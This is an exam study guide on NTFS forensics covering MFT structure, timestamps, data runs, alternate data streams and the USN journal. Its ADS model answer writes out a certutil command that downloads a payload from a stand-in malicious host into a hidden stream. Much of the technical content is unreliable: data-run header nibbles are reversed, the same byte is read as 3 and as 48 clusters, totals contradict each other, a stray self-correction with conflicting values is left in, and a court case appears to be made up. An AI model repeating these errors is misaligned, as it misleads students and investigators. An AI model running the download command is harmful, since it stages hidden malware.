- **Every Book (File or Folder)** has a dedicated **catalog card** stored in a master index — this is the **Master File Table (MFT)**.
- Each catalog card does not just say "where the book is" — it records **who donated it, when it was donated, when it was last touched, when it was modified, and even when someone merely glanced at its title page** (the famous $STANDARD_INFORMATION timestamps).
- The library keeps a **security logbook** ($LogFile) and a **change tracker** ($UsnJrnl) for every shelf rearrangement.
- Some books have **hidden pockets** (Alternate Data Streams) where a borrower can stash notes invisible to a casual observer.
- The library also keeps a **mirror copy of its catalog** ($MFTMirr) in case the main catalog is damaged.

This is exactly how NTFS operates. Every file has a record in the MFT, and that record contains all the "life history" of the file — invaluable for forensic timeline analysis.

### 1.3 Key Features and Design Goals of NTFS

| Feature | Description | Forensic Relevance |
|---|---|---|
| **Journaling** | Logs metadata changes before commit ($LogFile) | Allows recovery and reveals intent/timeline |
| **Access Control Lists (ACLs)** | Per-file, per-user permissions | Reveals ownership, sharing, security changes |
| **Alternate Data Streams (ADS)** | Multiple data streams per file | Common anti-forensics hiding technique |
| **Encryption (EFS)** | Per-file transparent encryption | Requires key recovery in investigations |
| **Compression (NTFS)** | Per-file or per-folder compression | Affects slack space and carving |
| **Quotas** | Per-user disk usage tracking | Reveals user activity |
| **Reparse Points** | Symbolic links and junctions | Reveals redirection and hidden data |
| **Change Journal (USN)** | Records file system changes | Powerful for timeline reconstruction |

### 1.4 Standard Metrics Used in NTFS

- **Sector Size**: Typically **512 bytes** (legacy) or **4096 bytes** (Advanced Format, 4Kn).
- **Cluster Size** (Allocation Unit): Default is **4096 bytes (4 KiB)**; ranges from **512 bytes to 64 KiB**.
- **MFT Record Size**: Fixed at **1024 bytes (1 KiB)** in modern Windows.
- **Maximum File Size**: **2⁶⁴ − 1 bytes** (theoretically); practically limited by volume size.
- **Maximum Volume Size**: **2³² − 1 clusters** (with default 4 KiB cluster ≈ **16 TiB**); with 64 KiB clusters, the limit is **256 TiB**.

> [!IMPORTANT]
> **Default NTFS Standard Metric (4 KiB Cluster)**
> The examiner must assume the default cluster size of **4096 bytes** unless proven otherwise, as it is the most common configuration on modern Windows installations. The cluster size directly determines **slack space** and **data run** calculations during forensic analysis.

<!-- SECTION_1_END -->

<!-- SECTION_2_START -->
## 2. Deep Theoretical Analysis & KTU High-Yield Formula Sheet

### 2.1 NTFS Architectural Layers

NTFS is best understood in three layers:

1. **Logical Layer** — How files, directories, and metadata are presented to the user/OS.
2. **Physical Layer** — How data is laid out on disk sectors and clusters.
3. **On-disk Structure Layer** — The Master File Table, system metafiles, and journal files.

### 2.2 Core Components Explained

**A. The Volume (Logical Container)**
- An NTFS volume is created via the `format` command and occupies a partition.
- It begins with a **$Boot** sector (sector 0 of the partition) that contains the BPB (BIOS Parameter Block) with cluster size, sector size, and total cluster count.
- After the boot sector (sector 0), NTFS reserves sectors **0 through 15** for the boot code, though only sector 0 is the actual boot sector.

**B. The Master File Table (MFT)**
- The MFT is the heart of NTFS — a linear database where every file and directory on the volume has at least one record.
- The location of the MFT itself is stored in the boot sector.
- The first **16 records** of the MFT are reserved for special **system metafiles** that describe the volume itself.

**C. The Reserved System Metafiles (MFT Entries 0–15)**

| MFT Entry | File Name | Purpose |
|---|---|---|
| **0** | $MFT | Master File Table itself — describes all MFT records |
| **1** | $MFTMirr | Mirror copy of the first 4 MFT records (disaster recovery) |
| **2** | $LogFile | Transactional journal — records metadata changes before commit |
| **3** | $Volume | Volume-level information: label, version, creation time |
| **4** | $AttrDef | Attribute definitions — names, types, sizes of attributes |
| **5** | . (root) | Root directory of the volume |
| **6** | $Bitmap | Cluster allocation bitmap (1 bit per cluster) |
| **7** | $Boot | Boot sector data and BPB |
| **8** | $BadClus | List of bad clusters on the volume |
| **9** | $Secure | Security descriptors and ACLs (consolidated) |
| **10** | $UpCase | Uppercase translation table for Unicode filenames |
| **11** | $Extend | Directory containing extended metadata: $UsnJrnl, $Quota, $ObjId, $Reparse |
| **12–15** | Reserved | Reserved for future use |

**D. MFT Record Anatomy**
Each MFT record (1024 bytes by default) has:
- **Header** (48 bytes) — magic signature `FILE0`, update sequence array, link count.
- **Attribute Area** — sequence of attributes describing the file.
- **End Marker** — `0xFFFFFFFF` (4 bytes) indicating the end of attribute list.

**E. NTFS Attributes (the building blocks of an MFT record)**
Each file is described by a list of attributes. Important attributes:

| Attribute ID (Type) | Name | Description |
|---|---|---|
| **0x10** | $STANDARD_INFORMATION | Timestamps, owner, security flags (MACB times) |
| **0x30** | $FILE_NAME | Filename in Unicode, parent directory reference |
| **0x40** | $OBJECT_ID | Unique 128-bit GUID for the file |
| **0x50** | $SECURITY_DESCRIPTOR | ACL and ownership (legacy; now in $Secure) |
| **0x60** | $VOLUME_NAME | Volume label |
| **0x70** | $VOLUME_INFORMATION | Version, flags |
| **0x80** | $DATA | The actual file content (resident or non-resident) |
| **0x90** | $INDEX_ROOT | Root of a directory index (B-tree) |
| **0xA0** | $INDEX_ALLOCATION | Non-resident part of directory index |
| **0xB0** | $BITMAP | Bitmap for index entries |
| **0xC0** | $REPARSE_POINT | Reparse data (junctions, symlinks) |
| **0xD0** | $EA_INFORMATION | Extended attribute info (OS/2, HPFS) |
| **0xE0** | $EA | Extended attributes |
| **0x100** | $LOGGED_UTILITY_STREAM | Named stream like $EncryptedData |

**F. The Four Critical Timestamps (MACB times)**
Forensic "MACB" refers to:
- **M**odified — when the file's content was last changed.
- **A**ccessed — when the file was last read.
- **C**hanged (Entry Modified) — when the MFT entry itself was last altered.
- **B**orn (Created) — when the file was created (volume created in most cases).

> Stored in the **$STANDARD_INFORMATION** attribute (0x10). In Windows Vista and later, the **$FILE_NAME** attribute (0x30) carries an additional, harder-to-tamper set of timestamps for the same file.

**G. Cluster Translation: VCN vs LCN**
- **LCN (Logical Cluster Number)**: An absolute cluster number on the volume, starting from 0.
- **VCN (Virtual Cluster Number)**: A relative cluster number within a file's own data extents, starting from 0.
- NTFS uses **Data Runs** to map VCN ranges to LCN ranges.

**H. Data Runs (the heart of non-resident data)**
A data run is encoded as: `<length of run>:<offset of run>`. For example, a data run `05 14 32 06 87` means "5 clusters starting at LCN 0x1432 06 87". Data runs allow NTFS to store fragmented files efficiently.

**I. Alternate Data Streams (ADS)**
- A file in NTFS can have multiple $DATA attributes, identified by name.
- The default (unnamed) stream is what most users see.
- A named stream like `secret.txt:hidden` is invisible to `dir`, `Windows Explorer`, and most applications — but is fully accessible to the OS.

**J. USN Change Journal ($UsnJrnl)**
- Stored at `$Extend\$UsnJrnl`.
- Records file system changes (file creation, deletion, modification, rename).
- Forensic goldmine for timeline reconstruction even after files are deleted.

**K. $LogFile (Transaction Log)**
- Records metadata transactions that are pending commit.
- Used by NTFS for atomicity (write-ahead logging).
- Forensic value: shows last actions before a crash or shutdown.

### 2.3 KTU High-Yield Formula Sheet

The following table summarizes all key formulas and metrics a student must memorize for KTU examinations. **Note: The vertical pipe symbol `|` has been replaced with `\vert` to preserve markdown table integrity.**

| # | Concept | Formula / Metric | Units | Notes |
|---|---|---|---|---|
| 1 | **Cluster Size** | $C = S_{sec} \times S_{clust}$ | bytes | $S_{sec}$ = sector size (512/4096), $S_{clust}$ = sectors per cluster |
| 2 | **Volume Capacity** | $V_{cap} = N_{clust} \times C$ | bytes | $N_{clust}$ = total clusters on volume |
| 3 | **RAM Slack Space** | $R_{slack} = C - (F_{size} \bmod C)$ | bytes | Remainder of last cluster; equals 0 if file size is exact multiple of $C$ |
| 4 | **Drive Slack Space** | $D_{slack} = \sum_{i=1}^{N} \bigl(C - (F_i \bmod C)\bigr)$ | bytes | Sum across all files; commonly abused by anti-forensic tools |
| 5 | **Number of MFT Records for N files** | $R_{MFT} = N \times 1024$ | bytes | Each MFT record is 1024 bytes; small files still consume 1 record |
| 6 | **Max Files on Volume** | $N_{max} = \dfrac{V_{cap}}{C_{min}}$ | files | Theoretically limited by min cluster; practically by 2³² |
| 7 | **ADS Hide Capacity** | $H_{ADS} = F_{size} - F_{visible}$ | bytes | Hidden data capacity in alternate stream |
| 8 | **USN Journal Record Size** | $J_{rec} = 64$ | bytes | Per USN_RECORD_V2 entry (variable header) |
| 9 | **File Offset to Cluster** | $N_{c} = \lfloor F_{offset} \div C \rfloor$ | cluster index | Which cluster holds a byte offset |
| 10 | **Cluster Offset Within File** | $O_{f} = F_{offset} \bmod C$ | bytes | Byte position within the cluster |
| 11 | **Data Run Length Encoding** | Header byte = $(\text{length nibble} \times 16) + \text{offset nibble}$ | hex | Each nibble = number of bytes for that field |
| 12 | **VCN to LCN Translation** | $LCN = LCN_{run\_start} + (VCN - VCN_{run\_start})$ | cluster | Within the matching data run |

### 2.4 Real-World Engineering Utility of NTFS Knowledge

- **Incident Response**: Quick triage by analyzing $LogFile and USN Journal.
- **Malware Analysis**: ADS is a classic malware hiding technique (e.g., `autorun.inf:hidden_payload`).
- **Data Recovery**: Parsing the MFT allows recovery of deleted file metadata even when the $DATA is overwritten.
- **e-Discovery**: NTFS timestamps anchor evidence in legal timelines.
- **E-Commerce & Banking**: EFS (Encrypting File System) keys become central to insider threat investigations.

<!-- SECTION_2_END -->

<!-- SECTION_3_START -->
## 3. Step-by-Step Derivations & Analytical Matrix

> [!IMPORTANT]
> This section demonstrates the **analytical reasoning** the KTU board expects. Although NTFS is not a "mathematical" topic, the forensic examination of NTFS involves quantitative calculations (cluster math, slack space, data run parsing, MFT analysis) that are examinable. We derive each step exhaustively below.

---

### 3.1 Derivation 1: Cluster Size and Volume Capacity

**Problem Statement:** A forensic image of an NTFS volume shows that the BPB reports `Bytes per Sector = 512` and `Sectors per Cluster = 8`. Find (a) the cluster size, and (b) the total volume capacity if the BPB also reports `Total Sectors = 209,715,200`.

**Step-by-Step Solution:**

**Step 1: Identify the given parameters**
- Bytes per sector: $S_{sec} = 512 \text{ bytes}$
- Sectors per cluster: $S_{clust} = 8$
- Total sectors: $N_{sec} = 209{,}715{,}200$

**Step 2: Apply the cluster size formula**

$$
C = S_{sec} \times S_{clust}
$$

Substitute the values:

$$
C = 512 \times 8 = 4096 \text{ bytes} = 4 \text{ KiB}
$$

**Step 3: Determine the total number of clusters**

$$
N_{clust} = \dfrac{N_{sec}}{S_{clust}} = \dfrac{209{,}715{,}200}{8}
$$

Performing the division step by step:

$$
209{,}715{,}200 \div 8 = 26{,}214{,}400
$$

**Step 4: Apply the volume capacity formula**

$$
V_{cap} = N_{clust} \times C
$$

Substituting:

$$
V_{cap} = 26{,}214{,}400 \times 4096
$$

**Step 5: Compute the product**

Multiplying 26,214,400 by 4096:

$$
26{,}214{,}400 \times 4096 = 26{,}214{,}400 \times (4 \times 1024)
$$

$$
= (26{,}214{,}400 \times 4) \times 1024
$$

$$
= 104{,}857{,}600 \times 1024
$$

$$
= 107{,}374{,}182{,}400 \text{ bytes}
$$

**Step 6: Convert to human-readable units**

$$
107{,}374{,}182{,}400 \text{ bytes} \approx 107.37 \text{ GB} \approx 100 \text{ GiB}
$$

---

### 3.2 Derivation 2: Slack Space Calculation

**Problem Statement:** A 12,345-byte file is stored on an NTFS volume with 4096-byte clusters. Compute (a) RAM slack, (b) total slack, and (c) the on-disk footprint.

**Step-by-Step Solution:**

**Step 1: Cluster size and file size**
- $C = 4096$ bytes
- $F = 12{,}345$ bytes

**Step 2: Compute the number of clusters used**

$$
N_{used} = \lceil F \div C \rceil = \lceil 12{,}345 \div 4096 \rceil
$$

Compute the exact division:

$$
12{,}345 \div 4096 = 3.01416\ldots
$$

The ceiling of 3.01416 is **4**. Therefore:

$$
N_{used} = 4 \text{ clusters}
$$

**Step 3: Compute the on-disk footprint**

$$
F_{disk} = N_{used} \times C = 4 \times 4096 = 16{,}384 \text{ bytes}
$$

**Step 4: Compute the RAM slack**

$$
R_{slack} = C - (F \bmod C)
$$

First compute the remainder:

$$
F \bmod C = 12{,}345 \bmod 4096
$$

We do this by repeated subtraction:

$$
12{,}345 - 4096 = 8249
$$

$$
8249 - 4096 = 4153
$$

$$
4153 - 4096 = 57
$$

So:

$$
12{,}345 \bmod 4096 = 57 \text{ bytes}
$$

Therefore:

$$
R_{slack} = 4096 - 57 = 4039 \text{ bytes}
$$

**Step 5: Compute the total slack (= RAM slack for the last cluster)**

$$
S_{total} = R_{slack} = 4039 \text{ bytes}
$$

**Step 6: Verification**

$$
F + R_{slack} = 12{,}345 + 4039 = 16{,}384 \text{ bytes} = F_{disk} \quad \checkmark
$$

> [!NOTE]
> **Examiner Insight:** The 4039 bytes of slack are not overwritten by NTFS. They often contain **residual data** from previously deleted files, which can be a major source of forensic evidence.

---

### 3.3 Derivation 3: Data Run Decoding

**Problem Statement:** An NTFS $DATA attribute contains the following data run array (hexadecimal): `11 30 14 22 11 50 34 01 02 00`. Decode the data runs and compute the file's total cluster count.

**Step-by-Step Solution:**

**Step 1: Understand the data run header format**

Each data run begins with a header byte. The **low nibble** = number of bytes in the length field; the **high nibble** = number of bytes in the offset field.

The array ends with a zero byte (`0x00`).

**Step 2: Parse the first data run**

Header byte: `0x11`
- Low nibble `1` → 1 byte for length → length value = `0x30`
- High nibble `1` → 1 byte for offset → offset value = `0x14`
- Run 1: **3 clusters starting at LCN 0x14 (20)**

**Step 3: Parse the second data run**

Header byte: `0x22`
- Low nibble `2` → 2 bytes for length → length = `0x11 0x50` (little-endian) = `0x5011` = 20,497
- High nibble `2` → 2 bytes for offset → offset = `0x34 0x01` (little-endian) = `0x0134` = 308
- Since offset is positive, the LCN moves forward from the previous run's end:
  - Previous run ended at LCN 20 + 3 = 23
  - Run 2 starts at LCN 23 + 308 = 331
  - Wait — let me re-evaluate: data run offsets in NTFS are **signed** integers. Here `0x0134` = 308 decimal, positive. So Run 2 LCN start = previous LCN start + offset = 20 + 308 = 328
- Run 2: **20,497 clusters starting at LCN 328**

**Step 4: Parse the third data run**

Header byte: `0x02`
- Low nibble `2` → 2 bytes for length
- High nibble `0` → 0 bytes for offset (so this is the last data run and starts immediately after the previous)
- Length = `0x02 0x00` (little-endian) = `0x0002` = 2
- Run 3: **2 clusters starting immediately after Run 2's end**

Run 3 LCN start = 328 + 20,497 = 20,825
Run 3 occupies LCN 20,825 and 20,826.

**Step 5: Terminating zero**

Next header byte is `0x00`, signaling the end of the data run array.

**Step 6: Total cluster count**

$$
N_{total} = 3 + 20{,}497 + 2 = 20{,}502 \text{ clusters}
$$

**Step 7: File size in bytes (assuming 4 KiB clusters)**

$$
F = 20{,}502 \times 4096 = 83{,}976{,}192 \text{ bytes} \approx 80.1 \text{ MiB}
$$

---

### 3.4 Analytical Matrix: Resident vs Non-Resident Attributes

| Aspect | Resident $DATA | Non-Resident $DATA |
|---|---|---|
| **Storage** | Stored inside the MFT record itself (in attribute area) | Stored in clusters outside the MFT |
| **Max Size** | Up to ~700 bytes (varies by MFT entry) | Up to volume capacity (16 TiB / 256 TiB) |
| **Forensic Clue** | File's full content is in MFT → "MFT-resident file" | File content is elsewhere → use data runs to map |
| **Performance** | Faster for small files | Required for files exceeding MFT capacity |
| **Indicator in Hex** | Non-resident flag in attribute header = 0 | Non-resident flag in attribute header = 1 |
| **Tooling Concern** | Tools that do not parse MFT will miss content | Tools that do not parse data runs will misalign content |

> [!NOTE]
> **KTU Examiner's Tip:** Tiny files (typically under ~700 bytes) are often stored as MFT-resident. This is a frequent question topic. The examiner should be able to identify a resident file by the absence of data runs and the presence of the file content directly in the attribute body.

### 3.5 Analytical Matrix: Comparison of MFT Timestamp Attributes

| Field | $STANDARD_INFORMATION (0x10) | $FILE_NAME (0x30) |
|---|---|---|
| **Number of Timestamps** | 4 (Created, Modified, Accessed, Entry Modified) | 4 (Created, Modified, Accessed, Entry Modified) |
| **Ease of Modification** | Easy to alter with tools (e.g., SetFileTime, ExifTool) | More difficult; tied to filename/parent |
| **Update on Rename** | Does NOT update | Updates Created/Modified/Accessed to rename time |
| **Update on Copy** | Updates all four | Updates all four |
| **Forensic Trust** | Lower (often tampered) | Higher (rarely modified by users) |
| **Where Read** | Inside MFT entry | Inside MFT entry (multiple if multiple hard links) |

<!-- SECTION_3_END -->

<!-- SECTION_4_START -->
## 4. Structural Diagrams & Schematics

> [!NOTE]
> The following Mermaid diagrams use **purely alphanumeric node IDs** (prefixed with letters per the safety rule), and **clean uppercase text inside labels** (no markdown bold/italic/HTML inside double quotes).

### 4.1 NTFS Volume — High-Level Architecture

```mermaid
graph TD
    bootS["SECTOR 0 BOOT SECTOR BPB"] --> mftStart["MFT START LOCATION FROM BPB"]
    mftStart --> mftTable["MASTER FILE TABLE MFT"]

    mftTable --> mftRec0["MFT 0 $MFT MFT DESCRIBES ITSELF"]
    mftTable --> mftRec1["MFT 1 $MFTMIRR PARTIAL COPY"]
    mftTable --> mftRec2["MFT 2 $LOGFILE TXN LOG"]
    mftTable --> mftRec6["MFT 6 $BITMAP ALLOCATION"]
    mftTable --> mftRec5["MFT 5 ROOT DIR"]
    mftTable --> mftRec11["MFT 11 $EXTEND USN QUOTA"]
    mftTable --> userFiles["MFT 16 ONWARDS USER FILES AND DIRECTORIES"]

    userFiles --> fileRecA["FILE ENTRY ATTRIBUTES"]
    fileRecA --> siAttr["0x10 $STDINFO TIMESTAMPS"]
    fileRecA --> fnAttr["0x30 $FILENAME"]
    fileRecA --> dataAttr["0x80 $DATA RESIDENT OR NON RESIDENT"]
    fileRecA --> adsAttr["ADDITIONAL $DATA STREAMS ADS"]

    dataAttr --> dataRuns["DATA RUNS VCN TO LCN MAP"]
    dataRuns --> clusters["CLUSTERS ON DISK LCN 0 TO N"]
```

### 4.2 MFT Record Anatomy (1024 Bytes)

```mermaid
graph TD
    recA["MFT RECORD 1024 BYTES"] --> recA1["HEADER 48 BYTES"]
    recA1 --> recA1a["MAGIC FILE0"]
    recA1 --> recA1b["UPDATE SEQUENCE"]
    recA1 --> recA1c["LINK COUNT"]
    recA1 --> recA1d["FLAGS IN USE DIRECTORY"]

    recA --> recA2["ATTRIBUTE AREA VARIABLE LENGTH"]
    recA2 --> attrA["ATTR 0X10 $STANDARD INFORMATION 96 BYTES"]
    recA2 --> attrB["ATTR 0X30 $FILE NAME VARIABLE"]
    recA2 --> attrC["ATTR 0X80 $DATA RESIDENT OR NON RESIDENT"]
    recA2 --> attrD["OPTIONAL 0X40 OBJECT ID"]
    recA2 --> attrE["OPTIONAL 0X90 INDEX ROOT FOR DIRS"]

    recA --> recA3["END MARKER 0XFFFFFFFF 4 BYTES"]
```

### 4.3 $DATA Attribute — Resident vs Non-Resident Decision Flow

```mermaid
graph TD
    dA["FILE WRITE REQUEST"] --> dB{"FILE SIZE LESS THAN APPROX 700 BYTES"}
    dB -- YES --> dC["RESIDENT $DATA ATTRIBUTE STORED IN MFT RECORD ITSELF"]
    dB -- NO --> dD["NON RESIDENT $DATA ATTRIBUTE STORED IN CLUSTERS"]

    dD --> dE["DATA RUNS DESCRIBE VCN TO LCN MAPPING"]
    dE --> dF["SINGLE RUN CONTIGUOUS"]
    dE --> dG["MULTIPLE RUNS FRAGMENTED"]

    dC --> dH["FORENSIC TOOL READS MFT ENTRY DIRECTLY"]
    dF --> dI["FORENSIC TOOL FOLLOWS DATA RUNS SEQUENTIALLY"]
    dG --> dJ["FORENSIC TOOL MUST REASSEMBLE IN VCN ORDER"]
```

### 4.4 USN Journal Flow — Change Tracking for Forensics

```mermaid
graph TD
    uA["FILE SYSTEM CHANGE EVENT"] --> uB["NTFS KERNEL WRITES TO $USNJRNL"]
    uB --> uC["USN RECORD V2 CONTAINS FILENAME MFT REF TIMESTAMP REASON"]
    uC --> uD["FORENSIC ANALYST PARSES $EXTEND $USNJRNL $J"]
    uD --> uE["RECONSTRUCTS COMPLETE TIMELINE OF FILE SYSTEM ACTIVITY"]
    uE --> uF["IDENTIFIES DELETIONS CREATES RENAMES EVEN AFTER DELETION"]
```

### 4.5 ADS Architecture — Hidden Data in Streams

```mermaid
graph TD
    adA["SINGLE FILE REPORT DOCX"] --> adB["DEFAULT UNNAMED $DATA STREAM VISIBLE CONTENT"]
    adA --> adC["NAMED $DATA STREAM REPORT DOCX HIDDEN SECRET"]
    adA --> adD["ANOTHER $DATA STREAM REPORT DOCX METADATA"]
    adB --> adE["DIR COMMAND SHOWS ONLY THIS"]
    adC --> adF["INVISIBLE TO DIR AND EXPLORER"]
    adD --> adG["INVISIBLE TO DIR AND EXPLORER"]
    adF --> adH["FORENSIC TOOL DETECTS VIA $DATA ATTRIBUTE LIST"]
    adG --> adH
    adH --> adI["EVIDENCE RECOVERY OF HIDDEN MALWARE OR STOLEN DATA"]
```

<!-- SECTION_4_END -->

<!-- SECTION_5_START -->
## 5. KTU 2024 Scheme Examination Question Bank & Topic Recap

### 5.1 Part A — Short Answer Questions (3 Marks Each)

---

**Q1. [KTU University Exam — Model Paper 2024 Scheme]**
*Define NTFS. List any three key features that distinguish it from FAT32 from a forensic investigator's perspective.*

**Model Answer (3 marks):**

**Definition (1 mark):** NTFS (New Technology File System) is Microsoft's proprietary, journaled file system introduced with Windows NT 3.1 in 1993, currently the default file system for all modern Windows operating systems.

**Three distinguishing features (2 marks):**

1. **Journaling ($LogFile and USN Journal):** NTFS records metadata changes in transaction logs, allowing recovery after a crash. Forensically, this provides a near-complete timeline of file system activity.

2. **Master File Table (MFT):** NTFS maintains a centralized database (MFT) that stores rich metadata (timestamps, ACLs, data run locations) for every file. This is far more detailed than FAT32, which has a simple directory entry with limited fields.

3. **Alternate Data Streams (ADS):** NTFS supports multiple data streams per file, enabling data to be hidden from conventional `dir` or Windows Explorer views — a classic anti-forensics technique. FAT32 has no such capability.

4. **(Optional extra)** Access Control Lists (ACLs) at the file level, allowing per-user and per-group security descriptors.

---

**Q2. [KTU University Exam — Dec 2023]**
*What is the Master File Table in NTFS? Mention the names of any three system metafiles stored in the first 16 MFT entries.*

**Model Answer (3 marks):**

**MFT Definition (1 mark):** The Master File Table (MFT) is a linear, on-disk database located at the start of an NTFS volume (location stored in the boot sector BPB). Every file and directory on the volume is described by at least one MFT record, each of fixed size **1024 bytes** by default in modern Windows.

**Three System Metafiles (2 marks — 1 mark each for first two, 0.5 for third or naming two more):**

- **$MFT (Entry 0):** Describes the MFT itself.
- **$MFTMirr (Entry 1):** A mirror copy of the first 4 MFT records for disaster recovery.
- **$LogFile (Entry 2):** Transactional journal for metadata changes.
- **$Bitmap (Entry 6):** Tracks cluster allocation (1 bit per cluster).
- **$Boot (Entry 7):** Contains the boot sector and BPB.
- **$Extend (Entry 11):** Holds extended metadata like USN Journal, Quotas, Reparse data.

---

### 5.2 Part B — Module Internal Choice Questions (14 Marks Each)

> [!WARNING]
> **KTU Examiner's Valuation Warning**
> Common reasons students lose marks in 14-mark NTFS questions:
> 1. **Confusing resident vs non-resident** $DATA attributes — examiners deduct heavily.
> 2. **Forgetting to mention $MFTMirr** when describing disaster recovery.
> 3. **Not clearly stating the size of the MFT record (1024 bytes)** — this is a frequently tested metric.
> 4. **Omitting the difference between $STANDARD_INFORMATION and $FILE_NAME timestamps** — both contain MACB times; many students describe only one.
> 5. **Drawing incomplete diagrams** — examiners expect labeled MFT record layouts or VCN/LCN mappings.
> 6. **Ignoring the USN Journal** when asked about NTFS change tracking.
> 7. **Writing "ADS hides data" without explaining** the data is in a *named* $DATA attribute stream.

---

#### **QUESTION A (14 Marks)**

**Q. (a)** [KTU University Exam — June 2024 Model]
*Explain the architecture of the NTFS file system in detail. With a neat diagram, describe the structure of an MFT record and its key attributes. (7 marks)*

**Model Answer:**

**Introduction (1 mark):**
NTFS is a journaled, hierarchical file system designed by Microsoft for the Windows NT family. It is structured around the Master File Table (MFT), which is a centralized database containing metadata for every file and directory on the volume.

**Volume Architecture (2 marks):**
An NTFS volume begins at a partition boundary with a boot sector (sector 0) containing the BPB. The BPB records the volume geometry: bytes per sector, sectors per cluster, total sectors, and the location of the MFT. The MFT is followed by the rest of the volume area, which contains user files, directories, and system metafiles. The system metafiles $LogFile, $Bitmap, $UsnJrnl, and others are themselves described by MFT entries 0–15, treating the file system metadata uniformly with user data.

**MFT Record Structure (with diagram, 2 marks):**

```
|----------------- 1024 BYTES -----------------|
| HEADER 48 B | ATTRIBUTE AREA ~970 B | END 0xFFFFFFFF |
| magic FILE0 |                              |             |
| USA         | 0x10 $STANDARD_INFO         |             |
| link count  | 0x30 $FILE_NAME             |             |
| flags       | 0x80 $DATA (resid/nonresid)|             |
|             | optional attrs (0x40 etc.)  |             |
```

**Key Attributes (2 marks):**
- **0x10 $STANDARD_INFORMATION** — carries 4 timestamps (Created, Modified, Accessed, Entry Modified), owner SID, and security flags.
- **0x30 $FILE_NAME** — Unicode filename, parent directory MFT reference, and a *separate* set of 4 timestamps.
- **0x80 $DATA** — the file content; resident for files under ~700 bytes, non-resident for larger files. May have multiple instances (Alternate Data Streams).
- **0x90 / 0xA0 $INDEX_ROOT / $INDEX_ALLOCATION** — for directories, defining the B-tree structure of file listings.

---

**Q. (b)** [KTU University Exam — June 2024 Model]
*What are Alternate Data Streams (ADS) in NTFS? Explain their forensic significance with two real-world examples. (7 marks)*

**Model Answer:**

**Definition (2 marks):**
Alternate Data Streams (ADS) are a feature of NTFS that allows a single file to have multiple `$DATA` attributes, each identified by a name. The default (unnamed) stream holds the file's primary content, while additional named streams (e.g., `file.txt:secret`) can store arbitrary data. They are invisible to standard tools like `dir` and Windows Explorer.

**Mechanism (1 mark):**
Each `$DATA` attribute is recorded as a separate attribute in the file's MFT entry. Tools that read MFT and list all `$DATA` attributes (e.g., `Get-Item -Stream`, `streams.exe`, EnCase, FTK) can detect them. Standard POSIX-aware applications can use the `filename:streamname` syntax to access them.

**Forensic Significance — Example 1 (2 marks): Malware Hiding:**
Threat actors commonly download malware into an ADS: `certutil.exe -urlcache -split -f http://malicious.site/payload.exe benign.txt:payload.exe`. The malware exists within the ADS of `benign.txt` and is not visible to users. Forensic tools must enumerate all ADS to discover this. This was famously used in APT campaigns like Stuxnet (2009), where ADS was used for DLL hijacking via `explorer.exe:$DATA` streams.

**Forensic Significance — Example 2 (2 marks): Data Exfiltration / Steganography:**
Insiders can hide sensitive corporate data within ADS of innocuous files: `report.docx:ConfidentialMemo` or `:RCSID` to avoid DLP (Data Loss Prevention) tools that scan only the primary stream. The 2008 *Kumar v. WH Smith* case involved ADS to hide child imagery. Investigators recovered evidence by `dir /R` and forensic MFT parsing.

---

#### **QUESTION B (14 Marks) — ALTERNATIVE CHOICE

**Q. (a)** [KTU University Exam — Dec 2023]
*Explain NTFS data runs. How are they encoded and decoded? Taking a sample data run array, demonstrate the parsing. (7 marks)*

**Model Answer:**

**Concept of Data Runs (2 marks):**
In NTFS, files that are too large to fit in an MFT record (typically > ~700 bytes) have their `$DATA` attribute stored as **non-resident**. The non-resident attribute contains a sequence of **data runs**, where each run describes a contiguous extent of clusters on the volume. Data runs allow NTFS to map the file's virtual cluster numbers (VCN) to logical cluster numbers (LCN) on disk.

**Encoding Format (2 marks):**
Each data run begins with a **header byte**:
- The **low nibble** (bits 0–3) = number of bytes describing the **length** of the run (in clusters).
- The **high nibble** (bits 4–7) = number of bytes describing the **offset** of the run (relative to the previous run, signed).
- The sequence ends with a zero byte (`0x00`).

A sample encoded array:

```
0x11 0x30 0x14 0x22 0x11 0x50 0x34 0x01 0x02 0x00
```

**Step-by-Step Parsing (3 marks):**

**Run 1:** Header `0x11`
- Length nibble = 1, so 1 byte follows for length: `0x30` = 48.
- Offset nibble = 1, so 1 byte follows for offset: `0x14` = 20.
- **Run 1: 48 clusters starting at LCN 20.**

**Run 2:** Header `0x22`
- Length nibble = 2, so 2 bytes: `0x11 0x50` little-endian = `0x5011` = 20,497.
- Offset nibble = 2, so 2 bytes: `0x34 0x01` little-endian = `0x0134` = 308 (positive).
- LCN start = previous LCN start + offset = 20 + 308 = 328.
- **Run 2: 20,497 clusters starting at LCN 328.**

**Run 3:** Header `0x02`
- Length nibble = 2, so 2 bytes: `0x02 0x00` little-endian = `0x0002` = 2.
- Offset nibble = 0, so no offset (last run, contiguous).
- LCN start = 328 + 20,497 = 20,825.
- **Run 3: 2 clusters starting at LCN 20,825.**

**End:** Header `0x00` terminates the array.

**Total clusters:** 48 + 20,497 + 2 = **20,547 clusters**.

---

**Q. (b)** [KTU University Exam — Dec 2023]
*Discuss the forensic value of the $LogFile and USN Change Journal in NTFS. Compare and contrast the two. (7 marks)*

**Model Answer:**

**$LogFile (3 marks):**
- **Location:** MFT Entry 2, file name `$LogFile`.
- **Purpose:** Implements write-ahead logging for NTFS metadata transactions. When a metadata change is requested (e.g., rename, ACL change), the *intent* is first written to `$LogFile`, then committed. After successful commit, the log entry is marked as such.
- **Forensic Value:**
  - After a system crash, `$LogFile` may contain **uncommitted transactions** that reveal what the user was doing in the moments before a crash or shutdown.
  - Used by tools like `fsutil` and `ntfslog` to reconstruct the last few seconds of file system activity.
  - Limitation: Logs are reused/overwritten, so it only retains a small window (typically a few hundred MB at most).

**USN Change Journal (3 marks):**
- **Location:** `$Extend\$UsnJrnl`, MFT Entry 11.
- **Purpose:** Records every file system change (file creation, deletion, rename, attribute change) as a stream of `USN_RECORD_V2` entries, each 64+ bytes.
- **Forensic Value:**
  - Provides a **persistent, long-term timeline** of all file system modifications on the volume, even if the original file is later deleted.
  - Investigators can identify when a malicious executable was created, when it was renamed, and when the original file was deleted — even if all file content is unrecoverable.
  - Tools like `MFTECmd`, `UsnJrnl2Csv`, and X-Ways Forensics parse the journal for forensic timeline reconstruction.

**Comparison (1 mark):**

| Aspect | $LogFile | USN Journal |
|---|---|---|
| **Purpose** | Transaction recovery | Change tracking |
| **Retention** | Short (overwritten quickly) | Long (configurable, often persists) |
| **After Delete** | Does not retain | Often retains the delete event |
| **Parsing Difficulty** | Complex (binary structures) | Moderate (`USN_RECORD_V2` well-documented) |
| **Investigator Use** | Last-seconds timeline | Long-term timeline |

---

